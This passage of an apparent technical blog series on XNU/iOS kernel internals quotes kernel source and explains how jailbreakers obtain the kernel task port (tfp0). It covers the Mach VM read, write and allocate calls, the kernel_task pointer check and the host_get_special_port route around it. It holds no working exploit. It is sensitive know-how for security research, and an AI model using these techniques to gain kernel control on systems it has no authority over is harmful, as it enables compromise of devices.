    <span class="mi">617</span><span class="o">:</span> 	<span class="n">user_addr_t</span>		<span class="n">pid_addr</span>  <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">;</span>  
    <span class="mi">618</span><span class="o">:</span> 	<span class="n">proc_t</span> <span class="n">p</span><span class="p">;</span>
    <span class="mi">619</span><span class="o">:</span> 	<span class="n">task_t</span>		<span class="n">t1</span><span class="p">;</span>
    <span class="mi">620</span><span class="o">:</span> 	<span class="kt">int</span>	<span class="n">pid</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="mi">621</span><span class="o">:</span> 	<span class="n">kern_return_t</span>	<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">622</span><span class="o">:</span> 
    <span class="mi">623</span><span class="o">:</span> 	<span class="n">AUDIT_MACH_SYSCALL_ENTER</span><span class="p">(</span><span class="n">AUE_PIDFORTASK</span><span class="p">);</span>
    <span class="mi">624</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">mach_port1</span><span class="p">,</span> <span class="n">t</span><span class="p">);</span>
    <span class="mi">625</span><span class="o">:</span> 
    <span class="mi">626</span><span class="o">:</span> 	<span class="n">t1</span> <span class="o">=</span> <span class="n">port_name_to_task_inspect</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
    <span class="mi">627</span><span class="o">:</span> 
    <span class="mi">628</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">t1</span> <span class="o">==</span> <span class="n">TASK_NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">629</span><span class="o">:</span> 		<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_FAILURE</span><span class="p">;</span>
    <span class="mi">630</span><span class="o">:</span> 		<span class="k">goto</span> <span class="n">pftout</span><span class="p">;</span>
    <span class="mi">631</span><span class="o">:</span> 	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="mi">632</span><span class="o">:</span> 		<span class="n">p</span> <span class="o">=</span> <span class="n">get_bsdtask_info</span><span class="p">(</span><span class="n">t1</span><span class="p">);</span>
    <span class="mi">633</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">634</span><span class="o">:</span> 			<span class="n">pid</span>  <span class="o">=</span> <span class="n">proc_pid</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
    <span class="mi">635</span><span class="o">:</span> 			<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">636</span><span class="o">:</span> 		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">is_corpsetask</span><span class="p">(</span><span class="n">t1</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">637</span><span class="o">:</span> 			<span class="n">pid</span> <span class="o">=</span> <span class="n">task_pid</span><span class="p">(</span><span class="n">t1</span><span class="p">);</span>
    <span class="mi">638</span><span class="o">:</span> 			<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">639</span><span class="o">:</span> 		<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
    <span class="mi">640</span><span class="o">:</span> 			<span class="n">err</span> <span class="o">=</span> <span class="n">KERN_FAILURE</span><span class="p">;</span>
    <span class="mi">641</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">642</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">643</span><span class="o">:</span> 	<span class="n">task_deallocate</span><span class="p">(</span><span class="n">t1</span><span class="p">);</span>
    <span class="mi">644</span><span class="o">:</span> <span class="n">pftout</span><span class="o">:</span>
    <span class="mi">645</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="mi">646</span><span class="o">:</span> 	<span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">copyout</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span> <span class="n">pid_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
    <span class="mi">647</span><span class="o">:</span> 	<span class="n">AUDIT_MACH_SYSCALL_EXIT</span><span class="p">(</span><span class="n">err</span><span class="p">);</span>
    <span class="mi">648</span><span class="o">:</span> 	<span class="k">return</span><span class="p">(</span><span class="n">err</span><span class="p">);</span>
    <span class="mi">649</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">650</span><span class="o">:</span> </code></pre></figure>

<h2 id="kernel-task-port">Kernel Task Port</h2>

<p>The kernel is assigned the PID 0, and the corresponding process-less task is dubbed as the kernel task. Having a send right to the Kernel task gives you complete control of the kernel memory, it is possible to read and write into kernel memory and also inject arbitrary code by allocating memory. This is what exploits try to obtain.</p>

<p>As discussed before, one of the earlier ways to use <strong>task_for_pid(0)</strong> was by Patching out the check for pid 0. There was also the <strong>processer_set_tasks()</strong> API on Mac OS that on a not secure kernel (<strong>#if defined SECURE_KERNEL</strong>), i.e. Mac OS, returned the kernel task port as the first argument.</p>

<p>Once the kernel task port is obtained, the following five MACH APIs are frequently used to interact with the memory. It is important to note that to execute this function successfully, the caller must have a send right to the task port of the target task. If you look at the function prototype, the first argument is the target task (<strong>vm_map_t target_task</strong>). You can pass the kernel task port (<strong>mach_port_t tfp0</strong>) as the first argument, and the API will gladly accept it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*Allocate a region of virtual memory in the target task starting from user specified address*/</span>

    <span class="n">kern_return_t</span> 
    <span class="nf">mach_vm_allocate</span><span class="p">(</span>
    	<span class="n">vm_map_t</span> <span class="n">target</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span> <span class="o">*</span><span class="n">address</span><span class="p">,</span>
    	<span class="n">mach_vm_size_t</span> <span class="n">size</span><span class="p">,</span>
    	<span class="kt">int</span> <span class="n">flags</span>
    <span class="p">);</span>

    <span class="cm">/*Deallocate a region of virtual memory in the target task starting from user specified address*/</span>

    <span class="n">kern_return_t</span> 
    <span class="nf">mach_vm_deallocate</span>
    <span class="p">(</span>
    	<span class="n">vm_map_t</span> <span class="n">target</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">address</span><span class="p">,</span>
    	<span class="n">mach_vm_size_t</span> <span class="n">size</span>
    <span class="p">);</span>

    <span class="cm">/*Read Kernel Memory in the target task at a specified address and transfers it to dynamically allocated memory in the callers address space*/</span>

    <span class="n">kern_return_t</span>
    <span class="nf">mach_vm_read</span><span class="p">(</span>
    	<span class="n">vm_map_t</span>		<span class="n">map</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span>	<span class="n">addr</span><span class="p">,</span>
    	<span class="n">mach_vm_size_t</span>	<span class="n">size</span><span class="p">,</span>
    	<span class="n">pointer_t</span>		<span class="o">*</span><span class="n">data</span><span class="p">,</span>
    	<span class="n">mach_msg_type_number_t</span>	<span class="o">*</span><span class="n">data_size</span><span class="p">)</span> <span class="o">*</span><span class="n">data_size</span><span class="p">);</span>

    <span class="cm">/*Copy data from a caller-specified address to the given memory region in the target tasks address space*/</span>

    <span class="n">kern_return_t</span> 
    <span class="nf">mach_vm_write</span>
    <span class="p">(</span>
    	<span class="n">vm_map_t</span> <span class="n">target_task</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">address</span><span class="p">,</span>
    	<span class="n">vm_offset_t</span> <span class="n">data</span><span class="p">,</span>
    	<span class="n">mach_msg_type_number_t</span> <span class="n">dataCnt</span>
    <span class="p">);</span>

    <span class="cm">/*Sets the Protection attribute for a given memory range in the target tasks address space*/</span>

    <span class="n">kern_return_t</span> 
    <span class="nf">mach_vm_protect</span><span class="p">(</span>
    	<span class="n">vm_map_t</span> <span class="n">target_task</span><span class="p">,</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">address</span><span class="p">,</span>
    	<span class="n">mach_vm_size_t</span> <span class="n">size</span><span class="p">,</span> 
    	<span class="n">boolean_t</span> <span class="n">set_maximum</span><span class="p">,</span>
    	<span class="n">svm_prot_t</span> <span class="n">new_protection</span><span class="p">);</span></code></pre></figure>

<h2 id="hsp4-patch">hsp4 Patch</h2>

<p>One of the other techniques Apple implemented for preventing jailbreakers from getting the kernel task was a pointer check for the <strong>kernel_task</strong>. In this case, while the handle to the kernel task was obtained, the Mach VM calls would not work. The check starts from the <strong>ipc_kmsg_trace_send</strong> function. This calls the function <strong>convert_port_to_task_with_exec_token</strong>(Line 356) in <strong>osfmk/kern/ipc_kobject.c</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">ipc_kobject</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">343</span><span class="o">:</span> 	<span class="cm">/*
    344: 	 * Find the routine to call, and call it
    345: 	 * to perform the kernel function
    346: 	 */</span>
    <span class="mi">347</span><span class="o">:</span> 	<span class="n">ipc_kmsg_trace_send</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">option</span><span class="p">);</span>
    <span class="mi">348</span><span class="o">:</span> 	<span class="p">{</span>
    <span class="mi">349</span><span class="o">:</span> 	    <span class="k">if</span> <span class="p">(</span><span class="n">ptr</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">350</span><span class="o">:</span> 		<span class="cm">/*
    351: 		 * Check if the port is a task port, if its a task port then
    352: 		 * snapshot the task exec token before the mig routine call.
    353: 		 */</span>
    <span class="mi">354</span><span class="o">:</span> 		<span class="n">ipc_port_t</span> <span class="n">port</span> <span class="o">=</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="o">-&gt;</span><span class="n">msgh_remote_port</span><span class="p">;</span>
    <span class="mi">355</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">==</span> <span class="n">IKOT_TASK</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">356</span><span class="o">:</span> 			<span class="n">task</span> <span class="o">=</span> <span class="n">convert_port_to_task_with_exec_token</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exec_token</span><span class="p">);</span>
    <span class="mi">357</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">358</span><span class="o">:</span> 
    <span class="mi">359</span><span class="o">:</span> 		<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">routine</span><span class="p">)(</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">,</span> <span class="n">reply</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">);</span>
    <span class="mi">360</span><span class="o">:</span> 
    <span class="mi">361</span><span class="o">:</span> 		<span class="cm">/* Check if the exec token changed during the mig routine */</span>
    <span class="mi">362</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">task</span> <span class="o">!=</span> <span class="n">TASK_NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">363</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">(</span><span class="n">exec_token</span> <span class="o">!=</span> <span class="n">task</span><span class="o">-&gt;</span><span class="n">exec_token</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">364</span><span class="o">:</span> 				<span class="n">exec_token_changed</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
    <span class="mi">365</span><span class="o">:</span> 			<span class="p">}</span>
    <span class="mi">366</span><span class="o">:</span> 			<span class="n">task_deallocate</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="mi">367</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">368</span><span class="o">:</span> 
    <span class="mi">369</span><span class="o">:</span> 		<span class="n">kernel_task</span><span class="o">-&gt;</span><span class="n">messages_received</span><span class="o">++</span><span class="p">;</span>
    <span class="mi">370</span><span class="o">:</span> 	    <span class="p">}</span>
    <span class="mi">371</span><span class="o">:</span> 	    <span class="k">else</span> <span class="p">{</span>
    <span class="mi">372</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ipc_kobject_notify</span><span class="p">(</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">,</span> <span class="n">reply</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">)){</span>
    <span class="mi">373</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">DEVELOPMENT</span> <span class="o">||</span> <span class="n">DEBUG</span>
    <span class="mi">374</span><span class="o">:</span> 		    <span class="n">printf</span><span class="p">(</span><span class="s">"ipc_kobject_server: bogus kernel message, id=%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
    <span class="mi">375</span><span class="o">:</span> 			<span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="o">-&gt;</span><span class="n">msgh_id</span><span class="p">);</span>
    <span class="mi">376</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* DEVELOPMENT || DEBUG */</span>
    <span class="mi">377</span><span class="o">:</span> 		    <span class="n">_MIG_MSGID_INVALID</span><span class="p">(</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="o">-&gt;</span><span class="n">msgh_id</span><span class="p">);</span>
    <span class="mi">378</span><span class="o">:</span> 
    <span class="mi">379</span><span class="o">:</span> 		    <span class="p">((</span><span class="n">mig_reply_error_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">reply</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">RetCode</span>
    <span class="mi">380</span><span class="o">:</span> 			<span class="o">=</span> <span class="n">MIG_BAD_ID</span><span class="p">;</span>
    <span class="mi">381</span><span class="o">:</span> 		<span class="p">}</span></code></pre></figure>

<p>The function <strong>convert_port_to_task_with_exec_token</strong> then calls <strong>task_conversion_eval</strong>(Line 1543).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">ipc_tt</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">1517</span><span class="o">:</span> <span class="cm">/*
    1518:  *	Routine:	convert_port_to_task_with_exec_token
    1519:  *	Purpose:
    1520:  *		Convert from a port to a task and return
    1521:  *		the exec token stored in the task.
    1522:  *		Doesn't consume the port ref; produces a task ref,
    1523:  *		which may be null.
    1524:  *	Conditions:
    1525:  *		Nothing locked.
    1526:  */</span>
    <span class="mi">1527</span><span class="o">:</span> <span class="n">task_t</span>
    <span class="mi">1528</span><span class="o">:</span> <span class="n">convert_port_to_task_with_exec_token</span><span class="p">(</span>
    <span class="mi">1529</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>		<span class="n">port</span><span class="p">,</span>
    <span class="mi">1530</span><span class="o">:</span> 	<span class="kt">uint32_t</span>		<span class="o">*</span><span class="n">exec_token</span><span class="p">)</span>
    <span class="mi">1531</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1532</span><span class="o">:</span> 	<span class="n">task_t</span>		<span class="n">task</span> <span class="o">=</span> <span class="n">TASK_NULL</span><span class="p">;</span>
    <span class="mi">1533</span><span class="o">:</span> 
    <span class="mi">1534</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">1535</span><span class="o">:</span> 		<span class="n">ip_lock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">1536</span><span class="o">:</span> 
    <span class="mi">1537</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span>	<span class="n">ip_active</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>					<span class="o">&amp;&amp;</span>
    <span class="mi">1538</span><span class="o">:</span> 				<span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">==</span> <span class="n">IKOT_TASK</span>		<span class="p">)</span> <span class="p">{</span>
    <span class="mi">1539</span><span class="o">:</span> 			<span class="n">task_t</span> <span class="n">ct</span> <span class="o">=</span> <span class="n">current_task</span><span class="p">();</span>
    <span class="mi">1540</span><span class="o">:</span> 			<span class="n">task</span> <span class="o">=</span> <span class="p">(</span><span class="n">task_t</span><span class="p">)</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_kobject</span><span class="p">;</span>
    <span class="mi">1541</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">task</span> <span class="o">!=</span> <span class="n">TASK_NULL</span><span class="p">);</span>
    <span class="mi">1542</span><span class="o">:</span> 
    <span class="mi">1543</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">(</span><span class="n">task_conversion_eval</span><span class="p">(</span><span class="n">ct</span><span class="p">,</span> <span class="n">task</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">1544</span><span class="o">:</span> 				<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">1545</span><span class="o">:</span> 				<span class="k">return</span> <span class="n">TASK_NULL</span><span class="p">;</span>
    <span class="mi">1546</span><span class="o">:</span> 			<span class="p">}</span>
    <span class="mi">1547</span><span class="o">:</span> 
    <span class="mi">1548</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">(</span><span class="n">exec_token</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1549</span><span class="o">:</span> 				<span class="o">*</span><span class="n">exec_token</span> <span class="o">=</span> <span class="n">task</span><span class="o">-&gt;</span><span class="n">exec_token</span><span class="p">;</span>
    <span class="mi">1550</span><span class="o">:</span> 			<span class="p">}</span>
    <span class="mi">1551</span><span class="o">:</span> 			<span class="n">task_reference_internal</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="mi">1552</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">1553</span><span class="o">:</span> 
    <span class="mi">1554</span><span class="o">:</span> 		<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">1555</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1556</span><span class="o">:</span> 
    <span class="mi">1557</span><span class="o">:</span> 	<span class="k">return</span> <span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="mi">1558</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">1559</span><span class="o">:</span> </code></pre></figure>

<p>This is where the check happens. The victim is the task on which operation is being performed and the caller is the one calling the function. The first check assumes if the caller is the kernel, and returns success if so. The second check is whether the caller is the same as the victim, which should be fine as a task should be able to perform operations on itself. The third check is where it makes a difference, if you make a change to the <strong>kernel_task</strong> and you are not <strong>kernel_task</strong> yourself, then the check will fail. However, this is just a pointer check with the <strong>kernel_task</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">ipc_tt</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">1369</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">1370</span><span class="o">:</span> <span class="n">task_conversion_eval</span><span class="p">(</span><span class="n">task_t</span> <span class="n">caller</span><span class="p">,</span> <span class="n">task_t</span> <span class="n">victim</span><span class="p">)</span>
    <span class="mi">1371</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1372</span><span class="o">:</span> 	<span class="cm">/*
    1373: 	 * Tasks are allowed to resolve their own task ports, and the kernel is
    1374: 	 * allowed to resolve anyone's task port.
    1375: 	 */</span>
    <span class="mi">1376</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">caller</span> <span class="o">==</span> <span class="n">kernel_task</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1377</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">1378</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1379</span><span class="o">:</span> 
    <span class="mi">1380</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">caller</span> <span class="o">==</span> <span class="n">victim</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1381</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">1382</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1383</span><span class="o">:</span> 
    <span class="mi">1384</span><span class="o">:</span> 	<span class="cm">/*
    1385: 	 * Only the kernel can can resolve the kernel's task port. We've established
    1386: 	 * by this point that the caller is not kernel_task.
    1387: 	 */</span>
    <span class="mi">1388</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">victim</span> <span class="o">==</span> <span class="n">TASK_NULL</span> <span class="o">||</span> <span class="n">victim</span> <span class="o">==</span> <span class="n">kernel_task</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1389</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_SECURITY</span><span class="p">;</span>
    <span class="mi">1390</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1391</span><span class="o">:</span> 
    <span class="mi">1392</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_EMBEDDED</span>
    <span class="mi">1393</span><span class="o">:</span> 	<span class="cm">/*
    1394: 	 * On embedded platforms, only a platform binary can resolve the task port
    1395: 	 * of another platform binary.
    1396: 	 */</span>
    <span class="mi">1397</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">((</span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">t_flags</span> <span class="o">&amp;</span> <span class="n">TF_PLATFORM</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">caller</span><span class="o">-&gt;</span><span class="n">t_flags</span> <span class="o">&amp;</span> <span class="n">TF_PLATFORM</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">1398</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">SECURE_KERNEL</span>
    <span class="mi">1399</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_SECURITY</span><span class="p">;</span>
    <span class="mi">1400</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>
    <span class="mi">1401</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">cs_relax_platform_task_ports</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">1402</span><span class="o">:</span> 			<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">1403</span><span class="o">:</span> 		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="mi">1404</span><span class="o">:</span> 			<span class="k">return</span> <span class="n">KERN_INVALID_SECURITY</span><span class="p">;</span>
    <span class="mi">1405</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">1406</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* SECURE_KERNEL */</span>
    <span class="mi">1407</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">1408</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* CONFIG_EMBEDDED */</span>
    <span class="mi">1409</span><span class="o">:</span> 
    <span class="mi">1410</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">1411</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">1412</span><span class="o">:</span> </code></pre></figure>

<p>So while the kernel task is still obtained, you won’t be able to call the Mach APIs on it since it goes through the conversion APIs which will return <strong>KERN_INVALID_SECURITY</strong> and the previous function will return a <strong>TASK_NULL</strong>. There is another check by the way, which is that on embedded platforms, the code checks for the <strong>TF_PLATFORM</strong> flag in the code signature, which is nothing but the <strong>platform-application</strong> entitlement, which means that a caller without this entitlement cannot perform an operation on the victim that has this entitlement. We will discuss this in Part 3 of this series.</p>

<p>Hence, one of the more recent techniques has been to use the <strong>host_get_special_port()</strong> function. To understand this, head over to the file <strong>osfmk/mach/host_special_ports.h</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">host_special_ports</span><span class="p">.</span><span class="n">h</span>
    <span class="mo">067</span><span class="o">:</span> <span class="cm">/*
    068:  * Cannot be set or gotten from user space
    069:  */</span>
    <span class="mo">070</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_SECURITY_PORT</span>               <span class="mi">0</span>
    <span class="mo">071</span><span class="o">:</span> 
    <span class="mo">072</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_MIN_SPECIAL_PORT</span>            <span class="n">HOST_SECURITY_PORT</span>
    <span class="mo">073</span><span class="o">:</span> 
    <span class="mo">074</span><span class="o">:</span> <span class="cm">/*
    075:  * Always provided by kernel (cannot be set from user-space).
    076:  */</span>
    <span class="mo">077</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_PORT</span>                        <span class="mi">1</span>
    <span class="mo">07</span><span class="mi">8</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_PRIV_PORT</span>                   <span class="mi">2</span>
    <span class="mo">07</span><span class="mi">9</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_IO_MASTER_PORT</span>              <span class="mi">3</span>
    <span class="mi">080</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span>     <span class="mi">7</span> <span class="cm">/* room to grow */</span>
    <span class="mi">081</span><span class="o">:</span> 
    <span class="mi">082</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_LAST_SPECIAL_KERNEL_PORT</span>    <span class="n">HOST_IO_MASTER_PORT</span>
    <span class="mi">083</span><span class="o">:</span> 
    <span class="mi">084</span><span class="o">:</span> <span class="cm">/*
    085:  * Not provided by kernel
    086:  */</span>
    <span class="mi">087</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_DYNAMIC_PAGER_PORT</span>         <span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">088</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_AUDIT_CONTROL_PORT</span>         <span class="p">(</span><span class="mi">2</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">089</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_USER_NOTIFICATION_PORT</span>     <span class="p">(</span><span class="mi">3</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">090</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_AUTOMOUNTD_PORT</span>            <span class="p">(</span><span class="mi">4</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">091</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_LOCKD_PORT</span>                 <span class="p">(</span><span class="mi">5</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">092</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_KTRACE_BACKGROUND_PORT</span>     <span class="p">(</span><span class="mi">6</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">093</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_SEATBELT_PORT</span>              <span class="p">(</span><span class="mi">7</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">094</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_KEXTD_PORT</span>                 <span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">095</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_LAUNCHCTL_PORT</span>             <span class="p">(</span><span class="mi">9</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
    <span class="mi">096</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">HOST_UNFREED_PORT</span>		<span class="p">(</span><span class="mi">10</span> <span class="o">+</span> <span class="n">HOST_MAX_SPECIAL_KERNEL_PORT</span><span class="p">)</span>
